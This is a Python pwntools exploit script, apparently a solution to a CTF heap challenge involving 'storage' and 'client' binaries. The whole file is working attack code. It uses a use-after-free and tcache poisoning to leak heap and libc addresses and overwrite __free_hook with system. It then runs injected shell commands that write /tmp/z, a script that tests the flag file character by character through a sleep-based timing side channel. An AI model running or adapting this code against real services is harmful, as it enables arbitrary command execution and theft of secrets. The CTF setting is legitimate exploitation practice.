from pwn import *
import sys, os

log.info("For remote: %s HOST PORT" % sys.argv[0])
bin_name = "./client"

socket_name = "hisocket"
try:
  r = remote(sys.argv[1], int(sys.argv[2]))
except:
  p = process(["./storage", socket_name])
  r = process([bin_name, socket_name]) #, env = {})


def do_debug (cmd = ""):
  try:
    if sys.argv[1] == 'debug':
      gdb.attach (r, cmd)
  except:
    pass

elf = ELF ("./storage")
context.word_size = elf.elfclass

libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

context.terminal = ["tmux", "splitw", "-h"]
#context.log_level = 'debug'

def rr ():
  r.recvuntil (": exit")

def menu (idx):
  rr ()
  r.send ((str(idx) + "\x00").ljust(0x20, "\x41"))

def store (data, raw=False):
  #packet format: p64(1) + p64(0) + data
  menu (1)
  if raw is False:
    r.sendafter ("store?", data.ljust (0x20, "\x00"))
  else :
    r.sendafter ("store?", data)

def delete (idx):
  menu (2)
  r.sendafter ("delete?", str(idx).ljust (0x20, "\x00"))

def retrieve (idx):
  menu (3)
  r.sendafter ("retrieve?\n", str(idx).ljust (0x20, "A"))
  return r.recvn(0x20)

def rename (name):
  menu (4)
  r.sendafter ("name?", name)


str_table = "_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{} -!@#$%^&*()+-=~,./?<>[]"
flag = "flag{i_"
print flag[5:]
while True: 
  for cc in str_table:
    ii = ord(cc)
    context.log_level= 'error'
    r.close ()
    """ if local
    p.close ()
    os.system ("rm /tmp/sockethisocket 2>/dev/null")
    p = process(["./storage", socket_name])
    r = process([bin_name, socket_name]) #, env = {})
    """
    r = remote(sys.argv[1], int(sys.argv[2]))
    r.sendafter ("name?", "HI".ljust (0xff, "A"))

    for _ in xrange (17):
       store ("");

    rename ("\x00")
    delete (14)
    delete (16)
    heap_leak = u64 (retrieve (11)[:6] + "\x00\x00")
    log.info ("heap_leak: " + hex(heap_leak))
    delete (11) # freed address
    fake_target = heap_leak - 0x80
    store (p64(heap_leak - 0x80), 1)
    store (p64(0) + p64(0xe1) + p64(heap_leak), 1)
    store ("a", 1)
    for _ in xrange (8): 
      delete (16)
      rename (p64(fake_target))

    libc_leak = u64 (retrieve (16)[:6] + "\x00\x00")
    log.info ("libc_leak: " + hex(libc_leak))
    libc_base = libc_leak - 0x3ebca0
    log.info ("libc_base: " + hex(libc_base))
    free_hook = libc_base + libc.symbols["__free_hook"]
    system = libc_base + libc.symbols["system"]

    free_target = heap_leak - 0x210

    delete (3)
    rename (p64(free_target))
    delete (16)

    store (p64(free_hook), 1)
    store (p64(free_hook), 1)
    store (p64(system), 1)
    delete (0)
    store ('echo "#!/bin/sh">/tmp/z\x00');
    delete (0)
    store ('echo -n "a=\\`head -c{}">>/tmp/z\x00'.format (len(flag) + 1));
    delete (0)
    store ('echo " flag\\`;" >>/tmp/z\x00');
    delete (0)
    store ('echo -n "b=\\"flag{" >>/tmp/z\x00');
    delete (0)
  
    rawflag = flag[5:] + chr (ii)
    for sii in range (0, len(rawflag), 12):
      store ('echo -n "{}">>/tmp/z\x00'.format(rawflag[sii: sii+12]))
      delete (0)
    store ('echo "\\";" >>/tmp/z\x00');
    delete (0)
    store ('echo -n "if [ \\"\\$a\\" ">>/tmp/z\x00');
    delete (0)
    store ('echo -n "= \\"\\$b\\" ];" >>/tmp/z\x00');
    delete (0)
    store ('echo "then sleep 10;">>/tmp/z\x00');
    delete (0)
    store ('echo "else ls; fi;">>/tmp/z\x00');
    delete (0)
    store ('. /tmp/z\x00');
    delete (0)
    context.log_level= 'INFO'
    try :
      ret = r.recvn (30, timeout=5)
      if ret == "":
        raise Timeout
      log.failure ("Wrong :( - {}".format (hex(ii)))
    except :
      log.success ("Correct! - {}".format (hex(ii)))
      flag += chr(ii)
      print flag
      break
  if ii == 0x7f:
    sys.exit ("your code wrong!")

